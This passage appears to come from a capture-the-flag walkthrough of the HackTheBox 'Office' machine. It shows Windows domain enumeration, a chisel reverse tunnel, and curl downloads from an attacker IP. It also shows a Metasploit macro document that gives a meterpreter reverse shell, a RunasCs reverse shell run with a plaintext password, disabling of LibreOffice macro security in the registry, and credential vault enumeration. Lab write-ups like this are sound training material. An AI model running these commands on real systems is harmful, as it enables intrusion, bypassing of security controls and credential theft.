NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

`dir C:\\Users`:
```
    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/22/2024   9:22 AM                Administrator
d-----         1/18/2024  12:24 PM                HHogan 🔍
d-----         1/22/2024   9:22 AM                PPotts 🔍
d-r---         1/18/2024  12:29 PM                Public
d-----         1/18/2024  10:33 AM                tstark
d-----         1/22/2024   9:22 AM                web_account
```

`net user`:
```
User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            dlanor                   dmichael                 
dwolfe                   etower                   EWhite                   
Guest                    HHogan                   krbtgt                   
PPotts                   tstark                   web_account              
The command completed successfully.
```

`net user web_account`:
```
User name                    web_account
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/17/2024 9:51:08 AM
Password expires             Never
Password changeable          1/18/2024 9:51:08 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   11/13/2024 4:17:11 PM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
```

`net user tstark`:
```
User name                    tstark
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/8/2023 5:32:00 PM
Password expires             Never
Password changeable          5/9/2023 5:32:00 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   1/18/2024 11:46:28 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *Registry Editors 🔍
The command completed successfully.
```

`net user dwolfe`:
```
User name                    dwolfe
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/7/2023 4:09:54 PM
Password expires             Never
Password changeable          5/8/2023 4:09:54 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   5/8/2023 2:40:07 PM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
```

`net user HHogan`:
```
User name                    HHogan
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/6/2023 10:59:34 AM
Password expires             Never
Password changeable          5/7/2023 10:59:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   5/10/2023 4:30:58 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *GPO Managers 🔍        
The command completed successfully.
```

`net user PPotts`:
```
User name                    PPotts
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/2/2023 2:44:57 PM
Password expires             Never
Password changeable          5/3/2023 2:44:57 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   11/13/2024 4:17:30 PM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *Registry Editors     
The command completed successfully.
```

`net group`:
```
Group Accounts for \\DC

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*GPO Managers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Registry Editors
*Schema Admins
The command completed successfully.
```

`net localgroup`:
```
Aliases for \\DC

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

`net localgroup "Remote Management Users"`:
```
Alias name     Remote Management Users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members

-------------------------------------------------------------------------------
HHogan 🔍
The command completed successfully.
```

`dir C:\\`:
```
    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         2/14/2024   2:18 AM                Program Files
d-----         1/17/2024   1:10 PM                Program Files (x86)
d-----         5/10/2023  11:52 AM                SOC Analysis
d-r---         1/17/2024  10:50 AM                Users
d-----         2/14/2024   4:04 PM                Windows
d-----         1/24/2024   4:08 AM                xampp 🔍
```

`dir C:\\xampp`:
```
    Directory: C:\xampp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         4/13/2023   4:12 PM                anonymous
d-----         4/13/2023   4:12 PM                apache
d-----         4/13/2023   4:14 PM                cgi-bin
d-----         4/13/2023   4:12 PM                contrib
d-----         4/13/2023   4:14 PM                FileZillaFTP
d-----          5/9/2023   7:53 AM                htdocs 🔍

[...]
```

`dir C:\\xampp\htdocs`:
```
    Directory: C:\xampp\htdocs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2023   7:53 AM                administrator
d-----         1/30/2024   8:39 AM                internal 🔍
d-----          5/8/2023   3:10 PM                joomla 
```

`dir C:\\xampp\apache\conf`:
```
    Directory: C:\xampp\apache\conf


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         4/13/2023   4:14 PM                extra
d-----         4/13/2023   4:12 PM                original
d-----         4/13/2023   4:12 PM                ssl.crt
d-----         4/13/2023   4:12 PM                ssl.csr
d-----         4/13/2023   4:12 PM                ssl.key
-a----          3/7/2023   5:25 AM           1820 charset.conv
-a----          5/1/2023   6:01 PM          22218 httpd.conf 🔍
-a----          3/7/2023   5:25 AM          13449 magic
-a----          4/6/2023   2:24 AM          60869 mime.types
-a----          2/7/2023   6:37 AM          11259 openssl.cnf
```

`type C:\\xampp\apache\conf\httpd.conf`:
```
#
# This is the main Apache HTTP server configuration file.  It contains the
# configuration directives that give the server its instructions.
# See <URL:http://httpd.apache.org/docs/2.4/> for detailed information.
# In particular, see 
# <URL:http://httpd.apache.org/docs/2.4/mod/directives.html>
# for a discussion of each configuration directive.
#

[...]

#
# Listen: Allows you to bind Apache to specific IP addresses and/or
# ports, instead of the default. See also the <VirtualHost>
# directive.
#
# Change this to Listen on specific IP addresses as shown below to 
# prevent Apache from glomming onto all bound IP addresses.
#
#Listen 12.34.56.78:80
Listen 80
Listen 8083

<VirtualHost *:8083>
    DocumentRoot "C:\xampp\htdocs\internal" 📌
    ServerName localhost:8083 📌

    <Directory "C:\xampp\htdocs\internal">
        Options -Indexes +FollowSymLinks +MultiViews
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog "logs/myweb-error.log"
    CustomLog "logs/myweb-access.log" combined
</VirtualHost>

[...]
```

`netstat -ano | findstr "LISTENING"`:
```
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4880
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4880
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       4904 🔍
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       8
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8083           0.0.0.0:0              LISTENING       4880 📌
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2924
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       540
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1148
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1548
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       2332
  TCP    0.0.0.0:53691          0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:53706          0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:53713          0.0.0.0:0              LISTENING       2908
  TCP    0.0.0.0:53729          0.0.0.0:0              LISTENING       2916
  TCP    0.0.0.0:53753          0.0.0.0:0              LISTENING       660
  TCP    10.10.11.3:53          0.0.0.0:0              LISTENING       2908
  TCP    10.10.11.3:139         0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2908
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cd ~/tools`

`git clone https://github.com/jpillora/chisel`:
```
Cloning into 'chisel'...
remote: Enumerating objects: 2353, done.
remote: Counting objects: 100% (724/724), done.
remote: Compressing objects: 100% (285/285), done.
remote: Total 2353 (delta 560), reused 449 (delta 435), pack-reused 1629 (from 1)
Receiving objects: 100% (2353/2353), 3.46 MiB | 1.30 MiB/s, done.
Resolving deltas: 100% (1192/1192), done.
```

`GOOS=windows GOARCH=amd64 go build -o chisel_windows.exe`

`file ./chisel_windows.exe`:
```
./chisel_windows.exe: PE32+ executable (console) x86-64, for MS Windows, 15 sections
```

`cp ~/tools/chisel/chisel_windows.exe ./chisel.exe`

![Victim: web_account](https://custom-icon-badges.demolab.com/badge/Victim-web%5F_account-64b5f6?logo=windows11&logoColor=white)

`cd C:\\Users\web_account\appdata\local\temp`

`curl.exe http://10.10.14.22/chisel.exe -o chisel.exe`

`dir`:
```
    Directory: C:\Users\web_account\appdata\local\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/15/2024   9:30 AM       14228992 chisel.exe
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`chisel server --reverse --port 5555`:
```
2024/11/15 10:33:38 server: Reverse tunnelling enabled
2024/11/15 10:33:38 server: Fingerprint y+EyLG3gNMYKLj5f6UL50jejfOdmgRX2znkF3d8SboI=
2024/11/15 10:33:38 server: Listening on http://0.0.0.0:5555
```

![Victim: web_account](https://custom-icon-badges.demolab.com/badge/Victim-web%5F_account-64b5f6?logo=windows11&logoColor=white)

`.\chisel.exe client 10.10.14.22:5555 R:8083:127.0.0.1:8083`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
2024/11/15 10:34:50 server: session#1: Client version (0.0.0-src) differs from server version (1.10.1-0kali1)
2024/11/15 10:34:50 server: session#1: tun: proxy#R:8083=>8083: Listening
```

`curl -s -I http://127.0.0.1:8083`:
```http
HTTP/1.1 200 OK
Date: Fri, 15 Nov 2024 17:36:02 GMT
Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
Last-Modified: Tue, 30 Jan 2024 16:38:34 GMT
ETag: "13f9-6102c64bd5603"
Accept-Ranges: bytes
Content-Length: 5113
Content-Type: text/html
```

When navigating to the internal site via `http://127.0.0.1:8083`, we are presented with a business site accepting job applications.
By clicking on `Submit Application`, we are directed to a job application form.

<img src="./assets\screenshots\hackthebox_firefox_localhost_8083_resume_php.png" alt="HackTheBox - Office | firefox http://127.0.0.1:8083/resume.php" width="700"/>

We are asked to upload a resume. We attempt to upload a text file after filling out the form and get an error message stating that only `DOC`, `DOCX`, `DOCM` and `ODT` are supported file formats.

To test this feature, we create a test `ODT` file and upload it via the portal.

`echo 'TEST!' > ./test.odt`

![Victim: web_account](https://custom-icon-badges.demolab.com/badge/Victim-web%5F_account-64b5f6?logo=windows11&logoColor=white)

Checking `c:\xampp\htdocs\internal\applications` we see that our uploaded `ODT` file is stored there.

`Get-ChildItem -Path "C:\\xampp\htdocs\internal" -Filter *.odt -Recurse`:
```
    Directory: C:\xampp\htdocs\internal\applications 📌


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/15/2024  10:04 AM              6 test-it-30-000-0-5-years-test@mail-com.odt
```

`dir C:\\xampp\htdocs\internal\applications`:
```
    Directory: C:\xampp\htdocs\internal\applications


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/15/2024  11:12 AM              6 test-it-30-000-0-5-years-test@mail-com.odt
```

Checking the permissions of the `applications` folder, we see that `PPotts` has full control over the directory and `web_account` has write privileges over the directory, meaning we can upload our documents directly to the folder without having to use the website.

`icacls.exe C:\\xampp\htdocs\internal\applications`:
```
C:\\xampp\htdocs\internal\applications CREATOR OWNER:(OI)(CI)(IO)(F)
                                       OFFICE\PPotts:(OI)(CI)(NP)(F)
                                       NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                       NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F)
                                       OFFICE\web_account:(OI)(CI)(RX,W)
                                       BUILTIN\Administrators:(OI)(CI)(F)
                                       BUILTIN\Users:(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```

After waiting for a few minutes, we notice that someone has checked and deleted the file.

`dir C:\\xampp\htdocs\internal\applications`:
```
```

Checking the file system for which type of document editor they are using shows that `LibreOffice` is in use.

`dir C:\\Progra~1`:
```
    Directory: C:\Program Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/22/2024   9:58 AM                Common Files
d-----         1/25/2024  12:20 PM                Internet Explorer
d-----         1/17/2024   1:26 PM                LibreOffice 5 🔍
d-----          5/2/2023   5:22 PM                Microsoft OneDrive
d-----          5/8/2021   1:20 AM                ModifiableWindowsApps
d-----         4/14/2023   3:22 PM                Npcap
d-----         4/12/2023   4:30 PM                Oracle
d-----         2/14/2024   2:18 AM                VMware
d-----         4/17/2023   3:35 PM                Windows Defender
d-----         1/25/2024  12:20 PM                Windows Defender Advanced Threat Protection
d-----         1/25/2024  12:20 PM                Windows Mail
d-----         1/25/2024  12:20 PM                Windows Media Player
d-----          5/8/2021   2:35 AM                Windows NT
d-----          3/2/2022   7:58 PM                Windows Photo Viewer
d-----          5/8/2021   1:34 AM                WindowsPowerShell
d-----         4/14/2023   3:23 PM                Wireshark 
```

`Get-WMIObject -Class win32_product`:
```
IdentifyingNumber : {90160000-008C-0000-1000-0000000FF1CE}
Name              : Office 16 Click-to-Run Extensibility Component
Vendor            : Microsoft Corporation
Version           : 16.0.17126.20132
Caption           : Office 16 Click-to-Run Extensibility Component

IdentifyingNumber : {90160000-007E-0000-1000-0000000FF1CE}
Name              : Office 16 Click-to-Run Licensing Component
Vendor            : Microsoft Corporation
Version           : 16.0.17126.20132
Caption           : Office 16 Click-to-Run Licensing Component

IdentifyingNumber : {3407B900-37F5-4CC2-B612-5CD5D580A163}
Name              : Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.32.31332
Vendor            : Microsoft Corporation
Version           : 14.32.31332
Caption           : Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.32.31332

IdentifyingNumber : {F4499EE3-A166-496C-81BB-51D1BCDC70A9}
Name              : Microsoft Visual C++ 2022 X64 Additional Runtime - 14.32.31332
Vendor            : Microsoft Corporation
Version           : 14.32.31332
Caption           : Microsoft Visual C++ 2022 X64 Additional Runtime - 14.32.31332

IdentifyingNumber : {2B69F1E6-C4D6-44A2-AFAD-4BD0571D254E}
Name              : LibreOffice 5.2.6.2 📌
Vendor            : The Document Foundation
Version           : 5.2.6.2 📌
Caption           : LibreOffice 5.2.6.2

[...]
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

We fire up `MetaSploit` and prepare a payload to send to the target.

`msfconsole -q`

`search office macro`, `use exploit/multi/misc/openoffice_document_macro`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `set SRVHOST tun0`, `set SRVPORT 8080`, `set LHOST tun0`, `set LPORT 6666`, `set FILENAME test.odt`, `run`:
```
[*] Server started.
[*] Generating our odt file for Apache OpenOffice on Windows (PSH)...
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic/Standard
[*] Packaging file: Basic/Standard/Module1.xml
[*] Packaging file: Basic/Standard/script-lb.xml
[*] Packaging file: Basic/script-lc.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2/accelerator
[*] Packaging file: Configurations2/accelerator/current.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/META-INF
[*] Packaging file: META-INF/manifest.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Thumbnails
[*] Packaging file: Thumbnails/thumbnail.png
[*] Packaging file: content.xml
[*] Packaging file: manifest.rdf
[*] Packaging file: meta.xml
[*] Packaging file: mimetype
[*] Packaging file: settings.xml
[*] Packaging file: styles.xml
[+] test.odt stored at /home/kali/.msf4/local/test.odt
```

`cp /home/kali/.msf4/local/test.odt ./`

At this stage, we have a newly-generated `test.odt` file that we need to upload to the target.

![Victim: web_account](https://custom-icon-badges.demolab.com/badge/Victim-web%5F_account-64b5f6?logo=windows11&logoColor=white)

`wget.exe http://10.10.14.22/test.odt -o test.odt`

`cp test.odt C:\\xampp\htdocs\internal\applications\test.odt`

`dir C:\\xampp\htdocs\internal\applications`:
```
    Directory: C:\xampp\htdocs\internal\applications


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/15/2024   8:47 PM            297 test.odt
```

After a couple of minutes, we see that the payload is gone and we didn't catch a reverse shell.

`dir C:\\xampp\htdocs\internal\applications`:
```
```

According to the [LibreOffice wiki](https://wiki.documentfoundation.org/Deployment_and_Migration#Examples), there are registry values that can be used to control the security of the application. A particular value that catches our interest is the `MacroSecurityLevel`.
According to the documentation:
```
Security Level is set to High. In order to be able to open a macro it needs to be
set to Medium.
Set "Macro security level" to "High" and lock the settings:
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Se
curity\Scripting\MacroSecurityLevel]
"Value"="2"
"Final"=dword:00000001
```

We query the registry to determine the current setting for macro execution.

`reg.exe query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel"`:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel
    Value    REG_DWORD    0x3 📌
    Final    REG_DWORD    0x1
```

The value is set to `3`, which means it's set to `High` security level. We need to find a way to change this value to allow our macros to trigger. Checking the group permissions, we see that `tstark` is, in fact, a group member of a custom group `Registry Editors`, which means he can explicitly control registry values on the system.

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

We upload `RunasCs` to the target to attempt to gain an active session as `tstark`, since we have his system password.

`locate -i 'runascs'`:
```
/home/kali/tools/RunasCs
/home/kali/tools/RunasCs/RunasCs.exe
/home/kali/tools/RunasCs/RunasCs.zip
/home/kali/tools/RunasCs/RunasCs_net2.exe
```

`cp /home/kali/tools/RunasCs/RunasCs.exe ./runascs.exe`

`rlwrap nc -lnvp 7777`:
```
listening on [any] 7777 ...
```

![Victim: web_account](https://custom-icon-badges.demolab.com/badge/Victim-web%5F_account-64b5f6?logo=windows11&logoColor=white)

`curl http://10.10.14.22/runascs.exe -o runascs.exe`

`dir`:
```
    Directory: C:\Users\web_account\appdata\local\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/15/2024   9:30 AM       14228992 chisel.exe
-a----        11/15/2024  11:01 AM          51712 runascs.exe 
```

`.\runascs.exe tstark playboy69 powershell.exe -r 10.10.14.22:7777`:
```
[*] Warning: The logon for user 'tstark' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-5a55a$\Default
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.3] 61791
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32>
```

![Victim: tstark](https://custom-icon-badges.demolab.com/badge/Victim-tstark-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
office\tstark
```

`whoami /all`:
```
USER INFORMATION
----------------

User Name     SID                                          
============= =============================================
office\tstark S-1-5-21-1199398058-4196589450-691661856-1114


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only                          
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
OFFICE\Registry Editors                    Group            S-1-5-21-1199398058-4196589450-691661856-1106 Mandatory group, Enabled by default, Enabled group 📌
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                     


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

`cd C:\\Users\tstark\Desktop`

`dir`:
```
    Directory: C:\Users\tstark\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/18/2024  10:51 AM             34 user.txt
```

`type user.txt`:
```
c6367*************************** 🚩
```

We attempt to change the registry values with our shell as `tstark`, then verify if the new value has been applied.

`reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" /v "Value" /t REG_DWORD /d 0 /f`:
```
The operation completed successfully.
```

`reg.exe query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel"`:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel
    Value    REG_DWORD    0x0 📌
    Final    REG_DWORD    0x1
```

![Victim: web_account](https://custom-icon-badges.demolab.com/badge/Victim-web%5F_account-64b5f6?logo=windows11&logoColor=white)

With the new registry value in place having disabled macro security, let's upload our payload again through our `web_account` shell.

`cp test.odt C:\\xampp\htdocs\internal\applications\test.odt`

`dir C:\\xampp\htdocs\internal\applications`:
```
    Directory: C:\xampp\htdocs\internal\applications


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/18/2024   2:41 PM           7714 test.odt 
```

After waiting for a couple of minutes, we get a shell as `PPotts`.

`dir C:\\xampp\htdocs\internal\applications`:
```
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
[*] 10.10.11.3       openoffice_document_macro - Sending payload
[*] Sending stage (203846 bytes) to 10.10.11.3
[*] Meterpreter session 1 opened (10.10.14.18:6666 -> 10.10.11.3:61462) at 2024-11-18 15:42:20 +0100
```

We switch to the opened session, create a new `cmd.exe` process and then migrate to that process to ensure stability.

`sessions -i 1`

![Victim: ppots](https://custom-icon-badges.demolab.com/badge/Victim-ppots-64b5f6?logo=windows11&logoColor=white)

`execute -H -f cmd.exe`:
```
Process 5592 created.
```

`migrate 5592`:
```
[*] Migrating from 4140 to 5592...
[*] Migration completed successfully.
```

`getuid`:
```
Server username: OFFICE\ppotts
```

`getprivs`:
```
Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeMachineAccountPrivilege
```

`execute -f powershell.exe -a "whoami /all" -i -H`:
```
Process 3144 created.
Channel 1 created.

USER INFORMATION
----------------

User Name     SID                                          
============= =============================================
office\ppotts S-1-5-21-1199398058-4196589450-691661856-1107


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only                          
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
OFFICE\Registry Editors                    Group            S-1-5-21-1199398058-4196589450-691661856-1106 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                     


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

We spawn a shell and check if there are any saved credentials on the user's accounts.

`shell`

`cmdkey.exe /list`:
```
Currently stored credentials:

    Target: LegacyGeneric:target=MyTarget
    Type: Generic 
    User: MyUser
    
    Target: Domain:interactive=office\hhogan
    Type: Domain Password 📌
    User: office\hhogan 📌
```

`vaultcmd.exe /list`:
```
Currently loaded vaults:
        Vault: Web Credentials
        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Location: C:\Users\PPotts\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

        Vault: Windows Credentials 📌
        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
        Location: C:\Users\PPotts\AppData\Local\Microsoft\Vault 🔍
```

`vaultcmd.exe /listcreds:"Windows Credentials" /all`:
```
Credentials in vault: Windows Credentials

Credential schema: Windows Domain Password Credential
Resource: Domain:interactive=office\hhogan
Identity: office\hhogan
Hidden: No
Roaming: No
Property (schema element id,value): (100,3)
```

Using these credentials, we can attempt to run `runas` and see if we can access the `hhogan` account.

`runas.exe /user:office\HHogan /savecred "cmd /c whoami"`:
```
runas /user:office\HHogan /savecred "cmd /c whoami"
Enter the password for office\HHogan: 
```
❌

This fails because it prompts us for a password and expects the user to supply the password at least once before being able to continue to use the `/savecred` feature.
